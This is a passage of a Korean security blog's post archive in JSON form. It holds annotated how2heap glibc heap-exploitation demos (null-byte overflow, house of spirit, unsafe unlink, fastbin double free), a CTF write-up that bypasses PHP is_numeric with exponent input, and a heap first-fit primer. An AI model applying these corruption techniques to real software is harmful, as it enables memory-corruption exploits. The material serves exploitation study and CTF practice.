p)ex()","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"[How2Heap] Poison_null_byte","slug":"How2Heap-Poison-null-byte","date":"2019-05-31T02:18:06.000Z","updated":"2019-05-31T02:54:24.115Z","comments":true,"path":"2019/05/31/How2Heap-Poison-null-byte/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/31/How2Heap-Poison-null-byte/","excerpt":"","text":"Poison_null_byte.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;fprintf(stderr, \"null byte 2.0!\\n\");fprintf(stderr, \"테스트 환경: Ubuntu 14.04 64bit.\\n\");fprintf(stderr, \"이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다.\\n\");fprintf(stderr, \"이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다.\\n\");uint8_t* a;uint8_t* b;uint8_t* c;uint8_t* b1;uint8_t* b2;uint8_t* d;void *barrier;fprintf(stderr, \"'a'에 0x100 bytes 할당한다.\\n\");a = (uint8_t*) malloc(0x100);fprintf(stderr, \"a: %p\\n\", a);int real_a_size = malloc_usable_size(a);fprintf(stderr, \"우리는 'a'에 overflow가 발생하는 것을 원하기 때문에, 'a'의 '진짜' 크기를 알 필요가 있다. \"\"(반올림 때문에 0x100 이상이 될 수 있음): %#x\\n\", real_a_size);/* chunk size attribute cannot have a least significant byte with a value of 0x00.* the least significant byte of this will be 0x10, because the size of the chunk includes* the amount requested plus some amount required for the metadata. */b = (uint8_t*) malloc(0x200);fprintf(stderr, \"b: %p\\n\", b);c = (uint8_t*) malloc(0x100);fprintf(stderr, \"c: %p\\n\", c);barrier = malloc(0x100);fprintf(stderr, \"barrier를 %p에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다.\\n\"\"barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다.\\n\", barrier);uint64_t* b_size_ptr = (uint64_t*)(b - 8);// added fix for size==prev_size(next_chunk) check in newer versions of glibc// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30// this added check requires we are allowed to have null pointers in b (not just a c string)//*(size_t*)(b+0x1f0) = 0x200;fprintf(stderr, \"glibc의 새 버전에서 'chunksize(P) != prev_size (next_chunk(P))' 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다.\\n\");// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)// which is the value of b.size after its first byte has been overwritten with a NULL byte*(size_t*)(b+0x1f0) = 0x200;// this technique works by overwriting the size metadata of a free chunkfree(b);fprintf(stderr, \"b.size: %#lx\\n\", *b_size_ptr);fprintf(stderr, \"b.size: (0x200 + 0x10) | prev_in_use\\n\");fprintf(stderr, \"우리는 'b'의 metadata에 있는 single null byte를 이용해서 'a'를 overflow한다.\\n\");a[real_a_size] = 0; // exploit된 bug \"fprintf(stderr, \"b.size: %#lx\\n\", *b_size_ptr);uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;fprintf(stderr, \"c.prev_size: %#lx\\n\",*c_prev_size_ptr);// 이 malloc은 b였던 chunk에서 unlink를 호출하는 결과일 것이다.// The added check (commit id: 17f487b), if not properly handled as we did before,// will detect the heap corruption now.// The check is this: chunksize(P) != prev_size (next_chunk(P)) where// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)// next_chunk(P) == b-0x10+0x200 == b+0x1f0// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200fprintf(stderr, \"우리는 chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P)) 이후로 검사를 통과할 것이다.\\n\",*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));b1 = malloc(0x100);fprintf(stderr, \"b1: %p\\n\",b1);fprintf(stderr, \"이제 우리는 'b1'을 malloc한다. 그것은 'b'에 있던 곳에 위치할 것이다. \"\"이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: %#lx\\n\",*c_prev_size_ptr);fprintf(stderr, \"흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: %lx\\n\",*(((uint64_t*)c)-4));fprintf(stderr, \"'victim' chunk에 'b2'를 malloc한다.\\n\");// 보통 b2(victim)는 우리가 조작할 수 있는 취약한 포인터를 가진 구조일 것이다.b2 = malloc(0x80);fprintf(stderr, \"b2: %p\\n\",b2);memset(b2,'B',0x80);fprintf(stderr, \"현재 b2 content:\\n%s\\n\",b2);fprintf(stderr, \"이제 우리는 'b1'과 c를 free한다: 'b1'과 'c'청크는 consolidate될 것이다.(b2를 잊어버리고)\\n\");free(b1);free(c);fprintf(stderr, \"마지막으로, 'd'를 할당해서 'b2'를 overlapping한다.\\n\");d = malloc(0x300);fprintf(stderr, \"d: %p\\n\",d);fprintf(stderr, \"'d'와 'b2'가 overlap되었다.\\n\");memset(d,'D',0x300);fprintf(stderr, \"바뀐 b2 content:\\n%s\\n\",b2);&#125; null byte 2.0! 테스트 환경: Ubuntu 14.04 64bit. 이 기법은 glibc에서 tcache 옵션이 disabled된 상태에만 작동한다. 이 기법은 null바이트를 이용하여 malloc된 영역으로 off-by-one할때 사용할 수 있다. 'a’에 0x100 bytes 할당한다. a: 0x603010 우리는 'a’에 overflow가 발생하는 것을 원하기 때문에, 'a’의 ‘진짜’ 크기를 알 필요가 있다. (반올림 때문에 0x100 이상이 될 수 있음): 0x108 b: 0x603120 c: 0x603330 barrier를 0x603440에 할당하면, c는 free될 때 top-chunk로 consolidate되지 않는다. barrier가 엄격하게 필요한 건 아니지만 상황을 덜 혼란스럽게 만든다. glibc의 새 버전에서 ‘chunksize§ != prev_size (next_chunk§)’ 검사를 통과하려면 b안에 변경된(updated) 크기를 가지고 있어야 한다. b.size: 0x211 b.size: (0x200 + 0x10) | prev_in_use 우리는 'b’의 metadata에 있는 single null byte를 이용해서 'a’를 overflow한다. b.size: 0x200 c.prev_size: 0x210 우리는 chunksize§ == 0x200 == 0x200 == prev_size (next_chunk§) 이후로 검사를 통과할 것이다. b1: 0x603120 이제 우리는 'b1’을 malloc한다. 그것은 'b’에 있던 곳에 위치할 것이다. 이 시점에서 c.prev_size가 변경됐어야 했지만, 그렇지 않았다: 0x210 흥미롭게도, c.prev_size의 변경된 값은 c.prev_size 앞에 0x10 bytes로 write됐다: f0 ‘victim’ chunk에 'b2’를 malloc한다. b2: 0x603230 현재 b2 content: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB 이제 우리는 'b1’과 c를 free한다: 'b1’과 'c’청크는 consolidate될 것이다.(b2를 잊어버리고) 마지막으로, 'd’를 할당해서 'b2’를 overlapping한다. d: 0x603120 'd’와 'b2’가 overlap되었다. 바뀐 b2 content: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] House_of_spirit","slug":"How2Heap-House-of-spirit-c","date":"2019-05-29T07:05:24.000Z","updated":"2019-05-29T07:16:06.112Z","comments":true,"path":"2019/05/29/How2Heap-House-of-spirit-c/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/","excerpt":"","text":"House_of_spirit.c 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;fprintf(stderr, \"house of spirit\\n\");fprintf(stderr, \"malloc을 한 번 호출해서 메모리를 설정한다.\\n\");malloc(1);fprintf(stderr, \"이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.\\n\");unsigned long long *a;// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));fprintf(stderr, \"이 영역(메모리 길이: %lu)은 chunk가 2개 있다. 첫번째는 %p에서 시작하고 두번째는 %p에서 시작한다.\\n\", sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]);fprintf(stderr, \"이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.\\n\");fprintf(stderr, \"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\");fake_chunks[1] = 0x40; // this is the sizefprintf(stderr, \"*next* fake 영역의 chunk 크기는 온전해야 한다. 그것은 &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (main arena는 기본적으로 &lt; 128kb)이 nextsize 무결성 체크를 통과한다.그래서 fastbin 크기가 필요 없다.\\n\");// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8fake_chunks[9] = 0x1234; // nextsizefprintf(stderr, \"이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, %p.\\n\", &amp;fake_chunks[1]);fprintf(stderr, \"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\");a = &amp;fake_chunks[2];fprintf(stderr, \"overwrite된 포인터를 free한다.\\n\");puts(\"-------free(a)-------\\n\");free(a);fprintf(stderr, \"next malloc은 %p에 있는 fake chunk의 영역을 반환할 것이다. 그러면 %p이 될 것이다!\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]);fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));&#125; house of spirit malloc을 한 번 호출해서 메모리를 설정한다. 이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다. 이 영역(메모리 길이: 80)은 chunk가 2개 있다. 첫번째는 0x7fffffffe338에서 시작하고 두번째는 0x7fffffffe378에서 시작한다. 이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다. 이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, 0x7fffffffe338 overwrite된 포인터를 free한다. -------free(a)------- next malloc은 0x7fffffffe338에 있는 fake chunk의 영역을 반환할 것이다. 그러면 0x7fffffffe340이 될 것이다! malloc(0x30): 0x7fffffffe340","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] unsafe_unlink","slug":"How2Heap-unsafe-unlink-c","date":"2019-05-29T05:50:05.000Z","updated":"2019-05-29T07:18:15.939Z","comments":true,"path":"2019/05/29/How2Heap-unsafe-unlink-c/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/","excerpt":"","text":"unsafe_unlink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main()&#123;fprintf(stderr, \"unsafe unlink 2.0!\\n\");fprintf(stderr, \"테스트 환경: Ubuntu 14.04/16.04 64bit\\n\");fprintf(stderr, \"이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.\\n\");fprintf(stderr, \"대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.\\n\");int malloc_size = 0x80; // 우리는 fastbin을 사용하지 않을 정도로 커지고 싶다.int header_size = 2;fprintf(stderr, \"이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.\\n\\n\");chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1fprintf(stderr, \"global chunk0_ptr: %p, pointing to %p\\n\", &amp;chunk0_ptr, chunk0_ptr);fprintf(stderr, \"corrupt할 victim chunk: %p\\n\\n\", chunk1_ptr);fprintf(stderr, \"chunk0에 fake chunk를 생성한다.\\n\");fprintf(stderr, \"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.\\n\");chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);fprintf(stderr, \"&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.\\n\");fprintf(stderr, \"이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n\");chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);fprintf(stderr, \"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]);fprintf(stderr, \"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]);fprintf(stderr, \"chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.\\n\");uint64_t *chunk1_hdr = chunk1_ptr - header_size;fprintf(stderr, \"chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.\\n\");fprintf(stderr, \"fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.\\n\");chunk1_hdr[0] = malloc_size;fprintf(stderr, \"만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다.\\n\"\"그러나 이것은 새로운 값이다: %p\\n\",(void*)chunk1_hdr[0]);fprintf(stderr, \"chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.\\n\\n\");chunk1_hdr[1] &amp;= ~1;fprintf(stderr, \"이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다\\n\");fprintf(stderr, \"unlink 매크로 소스는 해당 링크에서 찾을 수 있다.\\n\"\"https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\");free(chunk1_ptr);fprintf(stderr, \"이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.\\n\");char victim_string[8];strcpy(victim_string,\"Hello!~\");chunk0_ptr[3] = (uint64_t) victim_string;fprintf(stderr, \"chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.\\n\");fprintf(stderr, \"원래 값: %s\\n\",victim_string);puts(\"-------chunk0_ptr[0]=0x4141414142424242LL-------\");chunk0_ptr[0] = 0x4141414142424242LL;fprintf(stderr, \"바뀐 값: %s\\n\",victim_string);&#125; [unsafe_unlink.c] unsafe unlink 2.0! 테스트 환경: Ubuntu 14.04/16.04 64bit 이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다. 대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다. 이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다. global chunk0_ptr: 0x602070, pointing to 0x603010 corrupt할 victim chunk: 0x6030a0 chunk0에 fake chunk를 생성한다. &amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다. &amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다. 이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False Fake chunk fd: 0x602058 Fake chunk bk: 0x602060 chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다. chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다. fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다. 만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 0x90이 될 것이다. 그러나 이것은 새로운 값이다: 0x80 chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다. 이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다 이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다. chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다. 원래 값: Hello!~ -------chunk0_ptr[0]=0x4141414142424242LL------- 바뀐 값: BBBBAAAA Source","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] fastbin_dup_into_consolidate","slug":"How2Heap-fastbin-dup-into-consolidate-c","date":"2019-05-28T05:15:29.000Z","updated":"2019-05-29T07:16:01.741Z","comments":true,"path":"2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/","excerpt":"","text":"fastbin_dup_into_consolidate.c 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123; void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, \"fastbin을 두개 할당한다: p1=%p p2=%p\\n\", p1, p2); fprintf(stderr, \"-------free(p1)-------\\n\"); free(p1); void* p3 = malloc(0x400); fprintf(stderr, \"malloc_consolidate()를 trigger하기 위해 largebin을 할당한다: p3=%p\\n\", p3); fprintf(stderr, \"malloc_consolidate()에서 p1은 unsorted bin으로 이동한다.\\n\"); fprintf(stderr, \"-------free(p1)-------\\n\"); free(p1); fprintf(stderr, \"double free 취약점을 trigger한다.\\n\"); fprintf(stderr, \"이제 p1이 fast-top에 있지 않기 때문에 malloc의 체크를 통과할 수 있다.\\n\"); fprintf(stderr, \"현재 p1은 unsorted bin과 fastbin 안에 있다.\\n\" \"그래서 우리는 주소를 2번 얻을 수 있다: %p %p\\n\", malloc(0x40), malloc(0x40));&#125; [fastbin_dup_into_consolidate.c] Source img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] fastbin_dup_into_stack","slug":"How2Heap-fastbin-dup-into-stack-c","date":"2019-05-27T12:36:51.000Z","updated":"2019-05-29T07:15:55.029Z","comments":true,"path":"2019/05/27/How2Heap-fastbin-dup-into-stack-c/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/","excerpt":"","text":"fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\\n\" \"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\\n\"); unsigned long long stack_var; fprintf(stderr, \"malloc이 반환해야 할 주소: %p.\\n\", 8+(char *)&amp;stack_var); fprintf(stderr, \"버퍼를 3개 할당한다.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"malloc a(8): %p\\n\", a); fprintf(stderr, \"malloc b(8): %p\\n\", b); fprintf(stderr, \"malloc c(8): %p\\n\", c); fprintf(stderr, \"-------free(a)-------\\n\"); free(a); fprintf(stderr, \"-------free(b)-------\\n\"); free(b); fprintf(stderr, \"-------free(a)-------\\n\"); free(a); fprintf(stderr, \"free list: [ %p, %p, %p ]\\n\" \"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\\n\", a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, \"1st malloc(8): %p\\n\", d); fprintf(stderr, \"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr, \"free list: [ %p ]\\n\", a); fprintf(stderr, \"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\\n\" \"그래서 stack에 fake free size(0x20)를 써준다.\\n\" \"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\\n\" \"그곳으로 포인터를 반환할 것이다.\\n\", a); stack_var = 0x20; fprintf(stderr, \"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\\n\", a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, \"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\\n\", malloc(8)); fprintf(stderr, \"4th malloc(8): %p\\n\", malloc(8));&#125; [fastbin_dup_into_stack.c] Source img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] fastbin_dup","slug":"How2Heap-fastbin-dup-c","date":"2019-05-27T10:31:21.000Z","updated":"2019-05-29T07:16:14.448Z","comments":true,"path":"2019/05/27/How2Heap-fastbin-dup-c/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/","excerpt":"","text":"fastbin_dup.c 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"Simple double-free attack with fastbins.\\n\"); fprintf(stderr, \"버퍼를 3개 할당한다\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \"malloc a(8): %p\\n\", a); fprintf(stderr, \"malloc b(8): %p\\n\", b); fprintf(stderr, \"malloc c(8): %p\\n\", c); fprintf(stderr, \"-------free(a)-------\\n\"); free(a); // a를 한번 더 free하면 에러가 발생한다.(free list의 top에 위치하고 있기 때문) fprintf(stderr, \"-------free(b)-------\\n\"); free(b); fprintf(stderr, \"-------free(a)-------\\n\"); free(a); // 이제 free list의 최상단에서 벗어났으니 free(a)가 가능하다. fprintf(stderr, \"free list: [ %p, %p, %p ]\\n\", a, b, a); fprintf(stderr, \"malloc을 세 번 하면, malloc a(8)를 두번 할당할 수 있다.\\n\"); fprintf(stderr, \"malloc a(8): %p\\n\", malloc(8)); fprintf(stderr, \"malloc b(8): %p\\n\", malloc(8)); fprintf(stderr, \"malloc c(8): %p\\n\", malloc(8));&#125; [fastbin_dup_into_stack.c] Source img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[HackCTF] Time WriteUp","slug":"HackCTF-Time-WriteUp","date":"2019-05-25T09:13:01.000Z","updated":"2019-05-26T10:06:01.261Z","comments":true,"path":"2019/05/25/HackCTF-Time-WriteUp/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/","excerpt":"","text":"Time [문제] 문제 링크 문제에서는 is_numeric을 사용하여 숫자를 체크한다. 그리고 끝에는 time값을 int로 변환을 해준 뒤 나온 값의 시간이 지나면 플래그를 뱉어낸다. [사진 1-1] 풀기 위해서는 5184000 ~ 7776000 사이의 값을 넣어야 하는데 단순하게 생각했을 때 해당 시간동안 계속 켜놓으면 된다. [사진 1-2] 값이 생각보다 크지 않았다면 말이다…해당 시간을 환산해보면 최소 60일동안 켜놔야 하므로 노답이다.[1] 그래서 다른 방법을 찾아야 하는데 공식 문서에 is_numeric에 관한 설명이 기재되어 있다. [사진 2-1] 설명에는 변수가 임의의 자릿수, 선택적 기호, 소수, 지수로 구성될 수 있다고 한다. [사진 2-2] 마찬가지로 예제에서도 모두 true로 통과하는 것을 볼 수 있다. 그렇다는 말은 즉슨, 소수점과 지수 e를 이용하면 위의 취약점을 공략할 수 있다는 소리가 된다. 5184000을 지수와 소수점으로 바꿔서 5.184000e6 으로 입력하면 끝에 정수(int) 형변환으로 인해 결국은 소수점 뒤에 자릿수는 모두 사라지게 되어 5초 뒤 플래그를 뱉어낸다. 원래는 16진수 값도 부분적으로 true를 반환했는데 php 7.0.0 버전부터는 16진수도 false로 반환하게끔 패치되었다. 따라서 해당 서버에는 php 7.0.0 이상의 버전을 사용하고 있다는 것도 알 수 있다. [FLAG] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); } 1.덤으로 전기세도 와장창 ↩","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Web","slug":"WriteUps/Web","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Web/"}],"tags":[{"name":"Wargame","slug":"Wargame","permalink":"http://j0n9hyun.github.io/tags/Wargame/"}]},{"title":"[Heap Thoery] First Fit","slug":"Heap-Theory-First-Fit","date":"2019-05-24T05:51:30.000Z","updated":"2019-05-24T12:58:22.144Z","comments":true,"path":"2019/05/24/Heap-Theory-First-Fit/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/","excerpt":"","text":"First Fit Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다. 그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다. 다음의 예제를 한번 살펴보자. 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char *a = malloc(300); char *b = malloc(250); printf(\"malloc(300) A : %p\\n\", a); printf(\"malloc(250) B : %p\\n\", b); free(a); puts(\"-------free malloc A-------\"); a = malloc(250); printf(\"malloc(250) A : %p\\n\", a);&#125; [Example.c] 3줄 요약 a와 b에 각각 malloc[1]을 요청한다. a를 free[2]한다. a에 다시 malloc[1]을 요청한다. a에 300, b에 250 바이트가 동적 할당 되었다. 둘은 서로 다른 크기를 가지고 있는데 a를 free 해준 뒤 다시 재할당을 해주면 어떻게 될까? [실행 결과] 서로 다른 크기로 할당했지만 결과는 이전과 동일한 주소를 가리키게 된다. 그렇다면 남은 50 바이트는 그대로 증발되느냐? 아니다. 남은 50바이트도 여전히 남아있다. 대신 a 청크가 두 개로 분리된다(300바이트 작을 경우). a1, a2 이런 식으로 말이다. head a1[250] a2[50] tail ↓ malloc(250) 재할당 후 head a2 (a1값 반환됨) tail 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char *a = malloc(100); char *b = malloc(100); char *c = malloc(100); char *d = 